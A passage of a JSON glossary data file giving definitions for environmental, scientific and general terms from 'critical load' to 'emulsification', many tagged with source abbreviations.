RRDA)\"], \"critical load\": [\"The maximum load that a given system can tolerate before failing.\\\\n(Source: GRAHAWa)\"], \"crocodile\": [\"Any large tropical reptile of the family Crocodylidae: order Crocodylia. They have a broad head, tapering snout, massive jaws, and a thick outer covering of bony plates.\\\\n(Source: CED)\"], \"crop rotation\": [\"An agricultural technique in which, season after season, each field is sown with crop plants in a regular rotation, each crop being repeated at intervals of several years.\"], \"crop waste\": [\"Any unusable portion of plant matter left in a field after harvest.\\\\n(Source: CNI)\"], \"crossing place\": [\"A place, often shown by markings, lights, or poles, where a street, railway, etc. may be crossed.\"], \"crude oil\": [\"A comparatively volatile liquid bitumen composed principally of hydrocarbon, with traces of sulphur, nitrogen or oxygen compounds; can be removed from the earth in a liquid state.\"], \"crustacean\": [\"A subphylum of arthropod animals having jointed feet and mandibles, two pairs of antennae, and segmented, chitin-encased bodies.\"], \"cryptogam\": [\"A large group of plants, comprising the Thallophyta, Bryophyta and Pteridophyta, the last of which are cryptogams.\"], \"crystallography\": [\"The branch of science that deals with the geometric description of crystals and their internal arrangement.\"], \"cultivated plant\": [\"Plants specially bred or improved by cultivation.\"], \"cultivation\": [\"The practice of growing and nurturing plants outside of their wild habitat (i.e., in gardens, nurseries, arboreta).\"], \"cultivation method\": [\"Any procedure or approach used to prepare land or soil for the growth of new crops, or to promote or improve the growth of existing crops.\"], \"cultural facility\": [\"Any building or structure used for programs or activities involving the arts or other endeavors that encourage refinement or development of the mind.\\\\n(Source: WCD / OED)\"], \"cultural heritage\": [\"The inherited body of beliefs, customs, artistic activity and knowledge that has been transmitted by ancestors.\\\\n(Source: RHW)\"], \"curriculum\": [\"The aggregate of courses of study provided in a particular school, college, university, adult education program, technical institution or some other educational program.\"], \"customs\": [\"Duties charged upon commodities on their importation into, or exportation out of, a country.\", \"The head office dealing with tariffs.\"], \"cyanate\": [\"A salt or ester of cyanic acid containing the radical OCN.\"], \"cyanide\": [\"Any of a group of compounds containing the CN group and derived from hydrogen cyanide, HCN.\"], \"cyclone\": [\"A storm characterized by the converging and rising giratory movement of the wind around a zone of low pressure (the eye) towards which it is violently pulled from a zone of high pressure.\"], \"cytology\": [\"A branch of the biological sciences which deals with the structure, behaviour, growth, and reproduction of cells and the functions and chemistry of cell components.\"], \"cytotoxicity\": [\"The degree to which an agent is toxic to cells.\"], \"dairy farm\": [\"A commercial establishment for processing or selling milk and milk products.\"], \"dairy industry\": [\"Production of food made from milk or milk products.\"], \"dairy product\": [\"Food which is derived from milk and contains mostly milk.\"], \"dam\": [\"Structure constructed across a watercourse or stream channel.\"], \"damage\": [\"An injury or harm impairing the function or condition of a person or thing.\\\\n(Source: CED)\", \"To put a thing in bad condition by making it suffer some damage.\", \"To mar the surface or appearance of.\"], \"dangerous goods\": [\"Goods or products that are full of hazards or risks when used, transported, etc.\"], \"data analysis\": [\"The evaluation of digital data, i.e. data represented by a sequence of code characters.\\\\n(Source: MGH)\"], \"data carrier\": [\"A medium on which data can be recorded, and which is usually easily transportable, such as cards, tape, paper, or disks.\"], \"data exchange\": [\"A reciprocal transfer of individual facts, statistics or items of information between two or more parties for the purpose of enhancing knowledge of the participants.\"], \"data processing\": [\"Any operation or combination of operations on data, including everything that happens to data from the time they are observed or collected to the time they are destroyed.\\\\n(Source: MGH)\"], \"data protection\": [\"Policies, procedures or devices designed to maintain the integrity or security of information.\"], \"dating\": [\"An estimation of the age of an artifact, biological vestige, linguistic usage, etc.\"], \"decay product\": [\"An isotope formed by the radioactive decay of some other isotope. This newly formed isotope possesses physical and chemical properties that are different from those of its parent isotope, and may also be radioactive.\"], \"DDT\": [\"A persistent organochlorine insecticide, also known as dichlorodiphenyltrichloroethane, that was introduced in the 1940s and used widely because of its persistence (meaning repeated applications were unnecessary), its low toxicity to mammals and its simplicity and cheapness of manufacture. It became dispersed all over the world and, with other organochlorines, had a disruptive effect on species high in food chains, especially on the breeding success of certain predatory birds. DDT is very stable, relatively insoluble in water, but highly soluble in fats. Health effects on humans are not clear, but it is less toxic than related compounds. It is poisonous to other vertebrates, especially fish, and is stored in the fatty tissue of animals as sublethal amounts of the less toxic DDE. Because of its effects on wildlife its use in most countries is now forbidden or strictly limited.\\\\n(Source: MGH /  ALL)\"], \"debt\": [\"Something owed to someone else.\", \"Passive balance that corresponds to the difference between all proceeds and all expenditures, the current ones and the ones registered on the capital account, excluding the financial operations.\"], \"deciduous forest\": [\"The temperate forests comprised of trees that seasonally shed their leaves, located in the east of the USA, in Western Europe from the Alps to Scandinavia, and in the eastern Asia. The trees of deciduous forests usually produce nuts and winged seeds.\\\\n(Source: WRIGHT)\"], \"deciduous tree\": [\"Any tree losing its leaves in autumn and growing new ones in the spring.\\\\n(Source: CAMB)\"], \"decision\": [\"A selection of something from a collection of options or alternatives.\", \"An opinion and judgment formed or emitted about something.\", \"Firmness of conviction.\"], \"decomposition\": [\"The reduction of the body of a formerly living organism into simpler forms of matter.\", \"The process by which a complex problem or system is broken down into parts that are easier to conceive, understand, program, and maintain.\"], \"decontamination\": [\"The removing or neutralizing of chemical, biological, or radiological contamination from a person, object, or area.\"], \"decree\": [\"A declaration of the court announcing the legal consequences of the facts found.\", \"Administrative, legislative or juridical act being issued by a executive organ being made of general or specific juridical prescriptions.\", \"To decide with authority.\", \"To issue a decree.\", \"High level administrative act usually issued by the head of State or, in some countries, the chief of the government.\"], \"deep sea\": [\"Region of open ocean beyond the continental shelf.\"], \"deep sea fishing\": [\"Fishing in the deepest parts of the sea.\"], \"deer\": [\"The common name for 41 species of even-toed ungulates that compose the family Cervidae in the order Artiodactyla; males have antlers.\"], \"defoliation\": [\"The drop of foliage from plants caused by herbicides such as Agent Orange, diuron, triazines, all of which interfere with photosynthesis.\"], \"deforestation\": [\"The removal of forest and undergrowth to increase the surface of arable land or to use the timber for construction or industrial purposes.\"], \"degradability\": [\"The capacity of being decomposed chemically or biologically.\"], \"degradation\": [\"The act of abasing.\", \"A lowering from one's standing or rank in office or society.\"], \"degreasing\": [\"The removal of grease.\"], \"de-inking\": [\"Series of processes by which various types of printing inks are removed from paper fibre pulp during the pre-processing and recycling of recovered paper products.\"], \"delinquency\": [\"Set of crimes.\", \"Failure to make payments on time.\"], \"delta\": [\"A delta is a vast, fan-shaped creation of land, or low-lying plain, formed from successive layers of sediment washed from uplands to the mouth of some rivers, such as the Nile, the Mississippi and the Ganges. The nutrient-rich sediment is deposited by rivers at the point where, or before which, the river flows into the sea. Deltas are formed when rivers supply and deposit sediments more quickly that they can be removed by waves of ocean currents. The importance of deltas was first discovered by prehistoric man, who was attracted to them because of their abundant animal and plant life. Connecting waterways through the deltas later provided natural routes for navigation and trade, and opened up access to the interior. Deltas are highly fertile and often highly populated areas. They would be under serious threat of flooding from any sea-level rise.\\\\n(Source: WRIGHT)\"], \"demand\": [\"The desire, ability and willingness of an individual to purchase a good or service.\", \"To desire a service or physical goods, often without returning the favor in kind.\"], \"democracy\": [\"A system of governance in which ultimate authority power is vested in the people and exercised directly by them or by their freely elected agents.\"], \"demographic evolution\": [\"The gradual pattern of change in the growth of human populations in a particular region or country, from a rapid increase in the birth and death rates to a leveling off in the growth rate due to reduced fertility and other factors.\\\\n(Source: DOE / ANT)\"], \"demography\": [\"The statistical study of human vital statistics and population dynamics (natality, mortality, age, profession etc).\", \"A statistic characterizing human populations or segments of human populations broken down by age or sex or income etc.\"], \"dendrochronology\": [\"The science of dating the age of a tree by studying annual growth rings.\"], \"dendrometry\": [\"The measuring of the diameter of standing trees from the ground with a dendrometer that can also be used to measure tree heights.\"], \"denitrification\": [\"The loss of nitrogen from soil by biological or chemical means.\"], \"deposition\": [\"The process by which polluting material is precipitated from the atmosphere and accumulates in ecosystems.\"], \"deregulation\": [\"The removal or relaxation of government control over the economic activities of some commercial entity, industry or economic sector.\"], \"dermapteran\": [\"Any of various insects of the order Dermaptera.\"], \"desalination\": [\"Removal of salt, as from water or soil.\", \"Removal of salt and other minerals from water.\"], \"desalination plant\": [\"Plant for the extraction of fresh water from saltwater by the removal of salts, usually by distilling.\"], \"desert\": [\"A wide, open, comparatively barren tract of land with few forms of life and little rainfall.\", \"Left behind by the owner or keeper.\", \"To leave someone who needs or counts on you.\"], \"desertification\": [\"The development of desert conditions as a result of human activity or climatic changes.\"], \"desert locust\": [\"One of about a dozen species of short-horned grasshoppers (Acridoidea) that are known to change their behavior and form swarms of adults or bands of hoppers (wingless nymphs). The swarms that form can be dense and highly mobile. (Source: FAO)\"], \"desorption\": [\"The process of removing a sorbed substance by the reverse of adsorption or absorption.\"], \"detection\": [\"The act or process of discovering evidence or proof of governmental, legal or ethical violations.\\\\n(Source: RHW)\", \"Act of detecting something with a detector.\"], \"detector\": [\"A mechanical, electrical, or chemical device that automatically identifies and records or registers a stimulus, such as an environmental change in pressure or temperature, an electrical signal, or radiation from a radioactive material.\"], \"detergent\": [\"A surface-active agent used for removing dirt and grease from a variety of surfaces and materials.\", \"A substance used when cleaning.\"], \"determination method\": [\"Method employed in the assessment or in the evaluation of a quantity, a quality, a fact, an event, etc.\\\\n(Source: ZINZANa)\"], \"deterrent\": [\"Any measure, implement or policy designed to discourage or restrain the actions or advance of another agent, organization or state.\\\\n(Source: RHW)\", \"Tending to deter.\"], \"detoxification\": [\"The act or process of removing a poison or the toxic properties of a substance in the body.\"], \"developed country\": [\"A nation possessing a relatively high degree of industrialization, infrastructure and other capital investment, sophisticated technology, widespread literacy and advanced living standards among its populations as a whole.\"], \"developing country\": [\"A country whose people are beginning to utilize available resources in order to bring about a sustained increase in per capita production of goods and services.\"], \"development aid\": [\"Economic assistance or other types of support provided to developing countries to promote or encourage advancement in living standards, institutions, infrastructure, agricultural practices and other aspects of an economy, and to resolve problems typically  associated with developing countries.\"], \"development area\": [\"Area which has been given special help from a government to encourage business and factories to be set up there.\"], \"development planning\": [\"The act or process of formulating a course of action that promotes the economic advancement of a region or people, particularly in countries known to have low levels of economic productivity and technological sophistication.\\\\n(Source: OED / WBG)\"], \"development plan\": [\"The statement of local planning policies that each local planning authority is required by statute to maintain, and which can only be made or altered by following the procedures prescribed for that purpose, which include obligations to consult widely and to hold a public local inquiry into objections. The development plan includes: 1) the structure plan for the area (normally prepared by the country council); 2) an area-wide development plan for each district council area.\\\\n(Source: GRAHAW)\"], \"dialysis\": [\"A process of selective diffusion through a membrane; usually used to separate low-molecular-weight solutes which diffuse through the membrane from the colloidal and high-molecular-weight solutes which do not.\", \"A method to clean the blood of patients with renal failure.\"], \"diatom\": [\"Unicellular algae, some of which are colonial, green or brownish in colour (but all contain chlorophyll) and with siliceous and often highly sculptured cell walls.\"], \"dictionary\": [\"A reference book containing an explanatory alphabetical list of words, identifying usually, the phonetic, grammatical, and semantic value of each word, often with etymology, citations, and usage guidance and other information.\"], \"didactics\": [\"The art or science of teaching.\"], \"diesel engine\": [\"An internal combustion engine operating on a thermodynamic cycle in which the ratio of compression of the air charge is sufficiently high to ignite the fuel subsequently injected into the combustion chamber.\"], \"diesel fuel\": [\"Heavy oil residue used as fuel for certain types of diesel engines.\"], \"differentiation\": [\"The development of cells so that they are capable of performing specialized functions in the organs and tissues of the organisms to which they belong.\", \"In mathematics, the process of finding a derivative.\"], \"diffusion\": [\"The spontaneous movement and scattering of particles (atoms and molecules), of liquid, gases, and solids.\\\\n(Source: MGH)\"], \"digested sludge\": [\"Sludge or thickened mixture of sewage solids with water that has been decomposed by anaerobic bacteria.\"], \"digital land model\": [\"A representation of a surface's topography stored in a numerical format. Each pixel has been assigned coordinates and an altitude.\\\\n(Source: CCRS)\"], \"diluted acid\": [\"A less concentrated acid.\"], \"dioxin\": [\"A heterocyclic and aromatic molecule, where two carbon atoms have been substituted by oxygen atoms.\"], \"direct discharger\": [\"Factory and industrial concern which does not discharge their sewage into public sewers, but directly into a waterway.\"], \"directive\": [\"The second rank of administrative acts (inferior to regulations, superior to decisions) made by the council or commission of the European Communities on order to carry out their tasks in accordance with the Treaties. They must be addressed to states, not individuals, but many create rights for individuals or allow the directive to be pleaded before municipal court.\"], \"disabled person\": [\"Person lacking one or more physical power, such as the ability to walk or to coordinate one's movements, as from the effects of a disease or accident, or through mental impairment.\"], \"disaster\": [\"The result of a vast ecological breakdown in the relations between man and his environment, a serious and sudden event (or slow, as in drought) on such a scale that the stricken community needs extraordinary efforts to cope with it, often with outside help or international aid.\", \"An event that results in large-scale damage and loss of human life, caused by natural forces, technical failure or human error.\"], \"disaster preparedness\": [\"The aggregate of measures to be taken in view of disasters, consisting of plans and action programmes designed to minimize loss of life and damage, to organize and facilitate effective rescue and relief, and to rehabilitate after disaster. Preparedness requires the necessary legislation and means to cope with disaster or similar emergency situations. It is also concerned with forecasting and warning, the education and training of the public, organization and management, including plans, training of personnel, the stockpiling of supplies and ensuring the needed funds and other resources.\\\\n(Source: GUNN)\"], \"disaster relief\": [\"Money, food or other assistance provided for those surviving a sudden, calamitous event causing loss of life, damage or hardship.\"], \"discharge regime\": [\"The rate of flow of a river at a particular moment in time, related to its volume and its velocity.\\\\n(Source: WHIT)\"], \"disease\": [\"A definite pathological process having a characteristic set of signs and symptoms which are detrimental to the well-being of the individual.\"], \"disinfectant\": [\"An agent, such as heat, radiation, or a chemical, that disinfects by destroying, neutralizing, or inhibiting the growth of disease-carrying microorganisms.\\\\n(Source: AMHER)\"], \"disinfection\": [\"The complex of physical, chemical or mechanical operations undertaken to destroy pathogenic germs.\"], \"dispatch note\": [\"Document accompanying something being transported (including living beings) and usually required at certain specific steps.\"], \"dispersion\": [\"A distribution of finely divided particles in a medium.\\\\n(Source: MGH)\"], \"displaced person\": [\"A person who, for different reasons or circumstances, has been compelled to leave his or her home.\"], \"disposal of warfare materials\": [\"Disposal of the material remnants of war, which can seriously impede development and cause injuries and the loss of lives and property.\"], \"dissolution\": [\"Dissolving of a material.\", \"Excessive indulgence in sensual pleasures.\"], \"dissolved organic carbon\": [\"The fraction of total organic carbon (all carbon atoms covalently bonded in organic molecules) in water that passes through a 0.45 micron pore-diameter filter.\\\\n(Source: WQA)\"], \"distillation\": [\"The process of producing a gas or vapour from a liquid by heating the liquid in a vessel and collecting and condensing the vapours into liquids.\"], \"distilling industry\": [\"A sector of the economy in which an aggregate of commercial enterprises is engaged in the manufacture and marketing of alcoholic beverages made by a distillation process of vaporization and condensation, such as vodka, rum, whiskey and other related beverages.\\\\n(Source: RHW / SIC)\"], \"distribution\": [\"The sum of the commercial and service activities that transfer the produced goods to the consumer.\", \"In statistics, the relative arrangements of the elements of a statistical population based on some criterion, as frequency, time, or location.\", \"The process by which commodities get to final consumers, including storing, selling, shipping, and advertising.\", \"In Linux, a collection of software making up the Linux operating system. The software is usually compiled by either a company or organization. It is designed to be easy to install, administer, and use by virtue of it being an integrated whole. Examples include Ubuntu, SUSE Linux, Red Hat, and Debian.\"], \"district heating\": [\"The supply of heat, either in the form of steam or hot water, from a central source to a group of buildings.\"], \"disused military site\": [\"Military site where all activity has ceased.\"], \"ditch\": [\"A long, narrow excavation artificially dug in the ground; especially an open and usually unpaved waterway, channel, or trench for conveying water for drainage or irrigation, and usually smaller than a canal. Some ditches may be natural watercourses.\"], \"DNA\": [\"The principal material of inheritance. It is found in chromosomes and consists of molecules that are long unbranched chains made up of many nucleotides. Each nucleotide is a combination of phosphoric acid, the monosaccharide deoxyribose and one of four nitrogenous bases: thymine, cytosine, adenine or guanine. The number of possible arrangements of nucleotides along the DNA chain is immense. Usually two DNA strands are linked together in parallel by specific base-pairing and are helically coiled. Replication of DNA molecules is accomplished by separation of the two strands, followed by the building up of matching strands by means of base-pairing, using the two halves as templates. By a mechanism involving RNA, the structure of DNA is translated into the structure of proteins during their synthesis from amino acids.\\\\n(Source: ALL)\"], \"document\": [\"Material of any kind, regardless of physical form, which furnishes information, evidence or ideas, including items such as contracts, bills of sale, letters, audio and video recordings, and machine readable data files.\", \"To record in documents.\", \"To support or supply with references.\"], \"documentation\": [\"The process of accumulating, classifying and disseminating information, often to support the claim or data given in a book or article.\\\\n(Source: OED)\"], \"dog\": [\"A common four-legged animal, especially kept by people as a pet or to hunt or guard things.\", \"A dull, unattractive girl or woman.\", \"An iron for holding wood in a fireplace.\"], \"domestic appliance\": [\"A machine or device, especially an electrical one used domestically.\"], \"domesticated animal\": [\"Wild animal which has been trained to live near a house and not be frightened of human beings.\\\\n(Source: PHC)\"], \"domestic trade\": [\"Trade wholly carried on at home; as distinguished from foreign commerce.\\\\n(Source: WESTS)\"], \"domestic waste\": [\"Waste generated by residential households and comprised of any material no longer wanted or needed.\\\\n(Source: EED)\"], \"dosage\": [\"The amount of a substance required to produce an effect.\\\\n(Source: CONFER)\"], \"dose\": [\"The amount of test substance administered. Dose is expressed as weight of test substance (g, mg) per unit weight of test animal (e.g., mg/kg), or as weight of food or drinking water.\\\\n(Source: LEE)\", \"A powerful hallucinogenic drug manufactured from lysergic acid.\"], \"dose-effect relationship\": [\"The relation between the quantity of a given substance and a measurable or observable effect.\"], \"dragonfly\": [\"Any of the insects composing six families of the suborder Anisoptera and having four large, membranous wings and compound eyes that provide keen vision.\"], \"drainage\": [\"1) Removal of groundwater or surface water, or of water from structures, by gravity or pumping.\\\\n2) The discharge of water from a soil by percolation (the process by which surface water moves downwards through cracks, joints and pores in soil and rocks).\\\\n(Source: MGH /  WHIT)\"], \"dredged material\": [\"Unconsolidated material removed from rivers, streams, and shallow seas with machines such as the bucket-ladder dredge, dragline dredge, or suction dredge.\"], \"drilling\": [\"The act of boring holes in the earth for finding water or oil, for geologic surveys, etc.\"], \"drinking water\": [\"Water that is suitable to drink, does not present health hazards and whose quality is regulated by legislation.\"], \"drinking water treatment\": [\"The Directive on the Quality of Surface Water Intended for Drinking Water defines three categories of water treatment (A1, A2, A3) from simple physical treatment and disinfection to intensive physical and chemical treatment. The treatment to be used depends on the quality of the water abstracted. The Directive uses imperative values for parameters known to have an adverse effect on health and also guide values for those which are less adverse. There is also a directive which complements the \\\"surface water abstraction\\\" Directive by indicating the methods of measurement and the frequency of sampling and analysis required.\\\\n(Source: PORT)\"], \"drought\": [\"A period of abnormally dry weather sufficiently prolonged so that the lack of water causes a serious hydrologic imbalance (such as crop damage, water supply shortage) in the affected area.\"], \"drought control\": [\"Measures taken to prevent, mitigate or eliminate damage caused to the ecosystem, especially crops, by a sustained period of dry weather.\"], \"dry cleaning\": [\"The cleaning of fabrics with a solvent other than water.\"], \"dry farming\": [\"A system of extensive agriculture allowing the production of crops without irrigation in areas of limited rainfall.\"], \"drying\": [\"The process of partially or totally removing water or other liquids from a solid.\"], \"drying out\": [\"Removal of water from any substance.\"], \"dual economy\": [\"An economy based upon two separate/distinct economic systems which co-exist in the same geographical space. Dualism is characteristic of many developing countries in which some parts of a country resemble advanced economies while other parts resemble traditional economies, i.e. there are circuits of production and exchange.\\\\n(Source: GOOD)\"], \"dune\": [\"A low mound, ridge, bank, or hill of loose, windblown granular material (generally sand, sometimes volcanic ash), either bare or covered with vegetation, capable of movement from place but always retaining its characteristic shape.\"], \"duration of sunshine\": [\"Period of the day during which the sun is shining.\"], \"dust\": [\"Any kind of solid material divided in particles of very small size.\", \"To remove solid material divided in particles of very small size to clean something.\", \"Dust or fine dirt to be found on the ground, on floors, on streets and ways.\"], \"dust removal\": [\"The removal of dust from air by ventilation or exhaust systems.\"], \"dwelling\": [\"Any enclosed space wholly or partially used or intended to be used for living, sleeping, cooking, and eating.\", \"The abode of a human being, their place of residence.\"], \"dye\": [\"A substance used to modify the color of something.\", \"To modify the color of something by applying dye.\"], \"dyke\": [\"An artificial wall, embankment, ridge, or mound, usually of earth or rock fill, built around a relatively flat, low-lying area to protect it from flooding.\"], \"dyke reinforcement\": [\"The addition of material to strengthen the structure of the dykes.\"], \"early warning system\": [\"Any series of procedures and devices designed to detect sudden or potential threats to persons, property or the environment at the first sign of danger.\"], \"earthquake\": [\"The violent shaking of the ground produced by deep seismic waves, originating from the epicentre.\"], \"earth science\": [\"The science that deals with the earth or any part thereof; includes the disciplines of geology, geography, oceanography and meteorology, among others.\"], \"Earth-Sun relationship\": [\"The Earth depends on the sun for its existence as a planet hospitable to life, and solar energy is the major factor determining the climate. Hence, conditions on the sun and conditions on Earth are inextricably linked. Although the sun's rays may appear unchanging, its radiation does vary. Many scientists suspect that sunspot activity has a greater influence on climatic change than variations attributed to the greenhouse effect.\\\\n(Source: WRIGHT)\"], \"earthworm\": [\"Any of numerous oligochaete worms of the suborder Lumbricina which burrow in the soil and help aerate and break up the ground.\"], \"earwig\": [\"Any of various insects of the order Dermaptera, which typically have an elongated body with small leathery forewings, semicircular membranous hindwings, and curved forceps at the tip of the abdomen.\"], \"East Africa\": [\"A geographic region of the African continent that includes Burundi, Kenya, Rwanda, Tanzania, Uganda, Ethiopia and Somalia, and also Mt. Kilimanjaro and Lake Victoria.\"], \"Eastern Asia\": [\"A geographic region of the Asian continent bordered by the Pacific Ocean in the east that includes China, Japan, Korea, Macao, Taiwan and Siberia.\"], \"Eastern Europe\": [\"A geographic region of the European continent west of Asia and east of Germany and the Adriatic Sea, traditionally consisting of countries that were formerly part of the Soviet Union, such as Poland, the Czech Republic, Slovakia, Hungary, Romania, Serbia, Croatia and Bulgaria.\"], \"East-West trade\": [\"Trade between countries and companies of the Western hemisphere with those of the Eastern hemisphere (usually referring to former Communist countries of Eastern Europe).\"], \"EC Council of Ministers\": [\"The organ of the EU that is primarily concerned with the formulation of policy and the adoption of Community legislation.\"], \"EC ecolabel\": [\"The European Community (EC) initiative to encourage the promotion of environmentally friendly products.\"], \"echinoderm\": [\"Marine coelomate animals distinguished from all others by an internal skeleton composed of calcite plates, and a water-vascular system to serve the needs of locomotion, respiration, nutrition or perception.\", \"A phylum of marine animals found at all ocean depths. The phylum appeared near the start of the Cambrian period, and contains about 7,000 living species,\"], \"ecological adaptation\": [\"Change in an organism so that it is better able to survive or reproduce, thereby contributing to its fitness.\"], \"ecological balance\": [\"The condition of equilibrium among the components of a natural community such that their relative numbers remain fairly constant and their ecosystem is stable. Gradual readjustments to the composition of a balanced community take place continually in response to natural ecological succession and to alterations in climatic and other influences.\\\\n(Source: ALL)\"], \"ecological niche\": [\"The space occupied by a species, which includes both the physical space as well as the functional role of the species.\"], \"ecology\": [\"The study of the interrelationships between living organisms and their environment.\"], \"trophic ecology\": [\"The study of the feeding relationships of organisms in communities and ecosystems. Trophic links between populations represent flows of organisms, organic energy and nutrients. Trophic transfers are important in population dynamics, biogeochemistry, and ecosystem energetics.\\\\n(Source: PARCOR)\"], \"economic analysis\": [\"The quantitative and qualitative identification, study, and evaluation of the nature of an economy or a system of organization or operation.\"], \"economic development\": [\"The state of nations and the historical processes of change experienced by them, the extent to which the resources of a nation are brought into productive use.\"], \"economic growth\": [\"An increase over successive periods in the productivity and wealth of a household, country or region, as measured by one of several possible variables, such as the gross domestic product.\"], \"economic instrument\": [\"Any tool or method used by an organization to achieve general developmental goals in the production of, or in the regulation of, material resources.\"], \"economic policy\": [\"A definite course of action adopted and pursued by a government, political party or enterprise pertaining to the production, distribution and use of income, wealth and commodities.\"], \"economics\": [\"The social study of the production, distribution, and consumption of wealth.\"], \"economic system\": [\"Organized sets of procedures used within or between communities to govern the production and distribution of goods and services.\"], \"economic theory\": [\"The study of relationships in the economy.\"], \"economic viability\": [\"Capability of developing and surviving as a relatively independent social, economic or political unit.\"], \"economic zoning\": [\"A land-use planning design or control where specific types of businesses or private sector investment are encouraged within designated boundaries.\\\\n(Source: ALL / EEN)\"], \"economy\": [\"The system of activities and administration through which a society uses its resources to produce wealth.\"], \"ecophysiology\": [\"The study of biophysical, biochemical and physiological processes used by animals to cope with factors of their physical environment, or employed during ecological interactions with other organisms.\"], \"ecosystem\": [\"A community of organisms and their physical environment interacting as an ecological unit.\\\\n(Source: LBC)\"], \"ecotourism\": [\"Excursions to relatively untouched lands, which for the tourist promise the chance to observe unusual wildlife and indigenous inhabitants.\"], \"ecotoxicity\": [\"Quality of some substances or preparations which present or may present immediate or delayed risks for one or more sectors of the environment.\\\\n(Source: GRAHAW)\"], \"ecotoxicology\": [\"The science dealing with the adverse effects of chemical, physical agents, and natural products on populations and communities of plants, animals and human beings.\"], \"ecotype\": [\"Species that has special characteristics which allow it to live in a certain habitat.\"], \"edaphology\": [\"The study of the relationships between soil and organisms, including the use made of land by mankind.\"], \"edible fat\": [\"A blend of a partially hydrogenated vegetable fat and natural butterfat.\"], \"education\": [\"The act or process of imparting or acquiring knowledge or skills.\"], \"educational institution\": [\"An organization or establishment devoted to the act or process of imparting or acquiring knowledge or skills.\\\\n(Source: RHW)\"], \"educational planning\": [\"The process of making arrangements or preparations to facilitate the training, instruction or study that leads to the acquisition of skills or knowledge, or the development of reasoning and judgment.\\\\n(Source: RHW)\"], \"education policy\": [\"A course of action adopted and pursued by government or some other organization, which promotes or determines the goals, methods and programs to be used for training, instruction or study that leads to the acquisition of skills or knowledge, or the development of reasoning and judgment.\\\\n(Source: RHW)\"], \"educational system\": [\"Any formulated, regular or special organization of instruction, training or knowledge disclosure, especially the institutional structures supporting that endeavor.\\\\n(Source: ISEP /  OED)\"], \"effect\": [\"The result or outcome of a cause. Effects include: a) direct effects, which are caused by the action and occur at the same time and place, b) indirect effects, which are caused by the action and are later in time or farther removed in distance, that are still reasonably foreseeable.\\\\n(Source: LANDY)\", \"Images or sound added to enhance the experience of viewing a movie or listening to music.\", \"The result or outcome of a cause.\", \"Consequence or result of a deed.\", \"Condition that which follows something on which it depends.\", \"[With verbal nouns, forming phrases approximately equivalent to the source verb]\"], \"efficiency criterion\": [\"Parameter or rule for assessing the competency in performance of production relative to the input of resources.\"], \"efficiency level\": [\"The ratio of output to input, usually given as a percentage.\"], \"effluent\": [\"Liquid waste or sewage discharged into a river or the sea.\"], \"egg\": [\"An approximately spherical or ellipsoidal body produced by birds, snakes, insects and other animals housing the embryo during its development.\", \"Egg (either fertilized or not) from domesticated birds, most commonly hens, seen as food.\", \"The female gamete of an animal or plant, capable of fusing with a male gamete to produce a zygote.\", \"The contents of one or more (hen's usually) eggs as a culinary ingredient, etc.\", \"Something shaped like an egg, such as an Easter egg or a chocolate egg.\", \"A swelling on one's head, usually large or noticeable, associated with an injury.\", \"A person of Caucasian (Western) ancestry, who has a strong desire to learn about and immerse him- or herself in East Asian culture, and/or such a person who is perceived as behaving as if he or she were Asian.\", \"In terms such as good egg, bad egg, tough egg etc., a person, fellow.\", \"A foolish or obnoxious person.\"], \"elasticity\": [\"Ability of a material to return to original dimensions after deformation.\"], \"electrical engineering\": [\"Engineering that deals with practical applications of electricity.\"], \"electrical industry\": [\"The generation, transmission, distribution and sale of electric power to the general public.\"], \"electricity\": [\"A general term used for all phenomena caused by electric charge whether static or in motion.\"], \"electricity consumption\": [\"Amount of electricity consumed by an apparatus.\"], \"electricity generation\": [\"The act or process of transforming other forms of energy into electric energy.\"], \"electric line\": [\"Wires conducting electric power from one location to another.\"], \"electric power\": [\"The rate at which electric energy is consumed or delivered by an electric device or system, equal to the product of the current and the voltage drop.\"], \"electric power plant\": [\"A stationary plant containing apparatus for large-scale conversion of some form of energy (such as hydraulic, steam, chemical, or nuclear energy) into electrical energy.\"], \"electric vehicle\": [\"Vehicle driven by an electric motor and characterized by being silent and less polluting.\"], \"electrokinetics\": [\"The study of the motion of electric charges, especially of steady currents in electric circuits, and of the motion of electrified particles in electric or magnetic fields.\\\\n(Source: MGH)\"], \"electrolysis\": [\"The production of a chemical reaction by passing an electric current through an electrolyte. In electrolysis, positive ions migrate to the cathode and negative ions to the anode.\"], \"electronics\": [\"Study, control, and application of the conduction of electricity through gases or vacuum or through semiconducting or conducting materials.\", \"Electronic part of a device.\"], \"electronic scrap\": [\"Any material from electronic devices and systems, generated as a waste stream in a processing operation or discarded after service.\"], \"electrosmog\": [\"Pollution caused by electric and magnetic fields generated by power lines, electrical equipment, mobile and cordless phones, radar, electrical household appliances, microwave ovens, radios, computers, electric clocks, etc.\"], \"chemical element\": [\"A substance made up of atoms with the same atomic number; common examples are hydrogen, gold, and iron.\"], \"emancipation\": [\"The state of being free from social or political restraint or from the inhibition of moral or social conventions.\"], \"embryo\": [\"An early stage of development in multicellular organisms.\", \"A minute rudimentary plant contained within a seed or an archegonium.\"], \"embryogenesis\": [\"The formation and development of an embryo from an egg.\"], \"emergency relief\": [\"Money, food or other assistance provided for those surviving a sudden and usually unexpected occurrence requiring immediate action, especially an incident of potential harm to human life, property or the environment.\"], \"emergency shelter\": [\"Shelter given to persons who are deprived of the essential necessities of life after a disaster.\"], \"emission\": [\"A discharge of particulate gaseous, or soluble waste material/pollution into the air from a polluting source.\"], \"emission factor\": [\"The relationship between the amount of pollutants produced to the amount of raw materials processed, or fuel consumed, in any polluting process.\"], \"emission forecast\": [\"The final step in a clean air plan is to predict future air quality to demonstrate that we can (if we can) meet the health standards by implementing the measures proposed in the plan. This is done by first projecting the emission inventory into the future, taking into account changes in population, housing, employment in specific business sectors, and vehicle miles traveled. These data are obtained from various sources and the resulting emissions are adjusted to account for regulations and control measures scheduled for implementation during the same time period. Additional adjustments are made to reflect large facilities that are expected to start up, modify, or shut down. The resulting inventory is an emission forecast, and is usually expressed in tons per day of particular pollutants for a given year. Additional steps may be required to determine how the forecasted quantities of air pollution will affect the overall air quality. One way to accomplish this is through computer modeling. A computer model simulates how pollutants disperse, react, and move in the air. The inputs to such a computer model are complex. They include weather patterns, terrain, and the chemical nature of air pollutants.\\\\n(Source: APCD)\"], \"emission situation\": [\"The overall state regarding pollutant emission in a given area.\"], \"emission standard\": [\"The maximum amount of discharge legally allowed from a single source, mobile or stationary.\"], \"employment\": [\"Productive activity, service, trade, or craft for which one is regularly paid.\", \"The work or occupation in which a person is employed.\", \"Act through which a subordinated work contract starts.\"], \"emulsification\": [\"The process of dispersing one liquid in a second immiscible liquid.\"], 